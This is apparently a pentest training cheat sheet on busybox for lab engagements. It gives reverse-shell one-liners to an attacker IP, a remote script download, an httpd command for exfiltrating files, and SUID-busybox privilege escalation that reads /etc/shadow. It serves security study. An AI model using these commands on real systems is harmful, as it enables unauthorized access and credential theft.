# busybox

**Tags:** `#busybox` `#embedded` `#iot` `#alpine` `#containers` `#shell` `#reverseshell` `#gtfobins`

"The Swiss Army knife of embedded Linux" — one binary that implements stripped-down versions
of hundreds of Unix tools (`sh`, `ls`, `cat`, `wget`, `nc`, `httpd`, …). You meet it on
**routers/IoT, initramfs, and minimal containers** (Alpine's `/bin/sh` *is* busybox), where it
may be the **only** shell and toolset available. Engagement value: knowing how to drive a
busybox-only box for shells and file transfer, plus its GTFOBins privesc when SUID.

**Source:** https://www.busybox.net · **GTFOBins:** https://gtfobins.github.io/gtfobins/busybox/
**Install:** it's usually the *target's* tool; on Kali `apt install busybox` for local testing.

---

## Driving a busybox Box

```bash
busybox                       # with no args, lists every compiled-in applet
busybox sh                    # get a shell (Alpine's default /bin/sh already is this)
busybox <applet> [args]       # run one applet explicitly, e.g. busybox ls -la
# applets are often symlinked, so `ls`, `wget`, `nc` already ARE busybox — check:
ls -la $(which ls) $(which nc) 2>/dev/null   # → busybox
```

> [!warning] **Applets are minimal.** busybox `wget`/`nc`/`grep`/`find` support far fewer flags
> than GNU. If a flag "doesn't work," it's probably not compiled in — check `busybox <applet> --help`.

---

## Reverse Shell & File Transfer with Only busybox

```bash
# Reverse shell — universal mkfifo method (works even when `nc -e` isn't compiled in)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | busybox sh -i 2>&1 | busybox nc 10.10.14.5 9001 > /tmp/f

# Some builds DO have -e:
busybox nc 10.10.14.5 9001 -e /bin/sh

# Download a file
busybox wget http://10.10.14.5:8001/lin.sh -O /tmp/lin.sh

# Serve files OFF the target (exfil / stage) — busybox has a tiny web server
busybox httpd -f -p 8001 -h /tmp
```

---

## Privilege Escalation (SUID busybox)

```bash
find / -perm -4000 2>/dev/null | grep -i busybox     # SUID busybox?
./busybox sh                                          # spawns a shell (GTFOBins)
```

A setuid busybox is a direct shell, and its bundled applets let you read/write privileged
files (`busybox cat /etc/shadow`, `busybox vi /etc/passwd`) with the elevated euid. See
[GTFOBins — busybox](https://gtfobins.github.io/gtfobins/busybox/).

> [!tip] **Container angle.** Alpine-based containers run busybox as `/bin/sh`; a container
> escape often drops you into a busybox environment. Its `nc`/`wget`/`httpd` are your transfer
> tools when nothing else is installed — see [[Techniques/Container Escape|Container Escape]].

---

## Quick Reference

| Goal | Command |
|---|---|
| List applets | `busybox` (no args) |
| Shell | `busybox sh` |
| Reverse shell (universal) | `mkfifo /tmp/f; cat /tmp/f\|busybox sh -i 2>&1\|busybox nc IP 9001 >/tmp/f` |
| Download | `busybox wget http://IP:8001/f -O /tmp/f` |
| Serve files | `busybox httpd -f -p 8001 -h /tmp` |
| SUID → shell | `./busybox sh` (check `find / -perm -4000`) |
| Read root file | `busybox cat /etc/shadow` (if SUID) |

---

> [!note] **See also** — [[Tools/Command Shell/Bash|Bash]] (the fuller shell, if present); catchers/transfer [[Tools/Remote Access/Netcat|Netcat]]; Alpine/container context [[Techniques/Container Escape|Container Escape]]; shell one-liners [[Class notes/HTB Academy/CPTS v2 (claude)/Shells & Payloads|Shells & Payloads]].

---

*Created: 2026-09-28*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
